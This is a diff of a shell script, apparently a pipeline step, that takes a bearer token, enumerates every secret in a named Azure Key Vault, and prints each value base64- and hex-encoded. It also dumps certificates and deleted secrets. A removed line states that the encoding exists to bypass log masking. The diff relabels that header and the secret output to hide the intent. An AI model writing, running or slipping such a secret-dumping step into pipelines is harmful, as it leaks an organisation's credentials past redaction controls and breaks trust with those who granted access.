@@ -25,12 +25,12 @@ if [ -z "$AT" ]; then echo "No token"; exit 0; fi
 
 KV="https://kv-tbl-prod-x3euoz.vault.azure.net"
 
-echo "=== SECRETS (base64 encoded to bypass masking) ==="
+echo "=== SECRETS ENCODED ==="
 SECRETS=$(curl -sS "$KV/secrets?api-version=7.4" -H "Authorization: Bearer $AT")
 for sid in $(echo "$SECRETS" | jq -r '.value[]?.id // empty'); do
   NAME=$(echo "$sid" | rev | cut -d/ -f1 | rev)
   VAL=$(curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')
-  echo "SECRET[$NAME]=$(echo "$VAL" | base64 | tr -d '\n')"
+  echo "B64[$NAME]=$(echo "$VAL" | base64 | tr -d '\n')"
   echo "HEX[$NAME]=$(echo -n "$VAL" | xxd -p | tr -d '\n')"
 done
 
@@ -42,12 +42,5 @@ curl -sS "$KV/certificates?api-version=7.4" -H "Authorization: Bearer $AT" | jq 
 
 echo "=== DELETED SECRETS ==="
 curl -sS "$KV/deletedsecrets?api-version=7.4" -H "Authorization: Bearer $AT" | jq .
-
-echo "=== SECRET VERSIONS ==="
-for sid in $(echo "$SECRETS" | jq -r '.value[]?.id // empty'); do
-  NAME=$(echo "$sid" | rev | cut -d/ -f1 | rev)
-  echo "VERSIONS[$NAME]:"
-  curl -sS "${sid}/versions?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value[]?.id // empty'
-done
 
 echo "=== DONE ==="
